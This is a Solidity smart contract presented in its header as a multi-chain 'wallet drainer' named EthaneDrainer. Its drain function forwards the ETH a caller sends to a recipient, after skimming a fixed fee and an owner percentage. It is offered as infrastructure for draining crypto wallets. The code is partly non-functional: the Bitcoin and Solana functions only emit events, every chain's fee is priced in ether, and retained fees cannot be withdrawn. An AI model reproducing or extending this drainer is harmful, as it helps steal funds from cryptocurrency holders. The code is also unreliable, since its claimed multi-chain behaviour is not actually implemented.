/**
 * Multi-chain Wallet Drainer - EthaneDrainer
 * Updated for compatibility with multiple blockchains
 * Ethereum, BNB Chain, Polygon, Avalanche, Tron (EVM-based), and placeholders for Bitcoin and Solana.
*/

// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

contract EthaneDrainer {

    address private owner;
    mapping(string => uint256) private fees; // Fee per blockchain
    mapping(string => uint8) private percentages; // Percentage per blockchain

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeeUpdated(string blockchain, uint256 newFee);
    event PercentageUpdated(string blockchain, uint8 newPercentage);
    event BitcoinTransactionInitiated(address indexed sender, uint256 amount, string recipientAddress);
    event SolanaTransactionInitiated(address indexed sender, uint256 amount, string recipientAddress);

    constructor() {
        owner = msg.sender;
        // Default settings for popular blockchains
        fees["Ethereum"] = 0.01 ether;
        fees["BNB"] = 0.01 ether;
        fees["Polygon"] = 0.005 ether;
        fees["Avalanche"] = 0.005 ether;
        fees["Tron"] = 0.0002 ether; // Simulated as ether equivalent

        percentages["Ethereum"] = 5;
        percentages["BNB"] = 5;
        percentages["Polygon"] = 3;
        percentages["Avalanche"] = 3;
        percentages["Tron"] = 1;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function updateFee(string memory blockchain, uint256 newFee) public onlyOwner {
        fees[blockchain] = newFee;
        emit FeeUpdated(blockchain, newFee);
    }

    function updatePercentage(string memory blockchain, uint8 newPercentage) public onlyOwner {
        require(newPercentage <= 100, "Percentage cannot exceed 100%");
        percentages[blockchain] = newPercentage;
        emit PercentageUpdated(blockchain, newPercentage);
    }

    function getFee(string memory blockchain) public view returns (uint256) {
        return fees[blockchain];
    }

    function getPercentage(string memory blockchain) public view returns (uint8) {
        return percentages[blockchain];
    }

    function drain(address payable recipient, string memory blockchain) public payable {
        uint256 fee = fees[blockchain];
        uint8 percentage = percentages[blockchain];

        require(msg.value >= fee, "Insufficient value sent for the transaction");

        uint256 amountToSend = msg.value - fee;
        uint256 ownerCut = (amountToSend * percentage) / 100;
        uint256 finalAmount = amountToSend - ownerCut;

        (bool successRecipient, ) = recipient.call{value: finalAmount}("");
        require(successRecipient, "Transfer to recipient failed");

        (bool successOwner, ) = payable(owner).call{value: ownerCut}("");
        require(successOwner, "Transfer to owner failed");
    }

    function initiateBitcoinTransaction(uint256 amount, string memory recipientAddress) public {
        require(amount > 0, "Amount must be greater than 0");
        emit BitcoinTransactionInitiated(msg.sender, amount, recipientAddress);
    }

    function initiateSolanaTransaction(uint256 amount, string memory recipientAddress) public {
        require(amount > 0, "Amount must be greater than 0");
        emit SolanaTransactionInitiated(msg.sender, amount, recipientAddress);
    }

    receive() external payable {}

    fallback() external payable {}
}
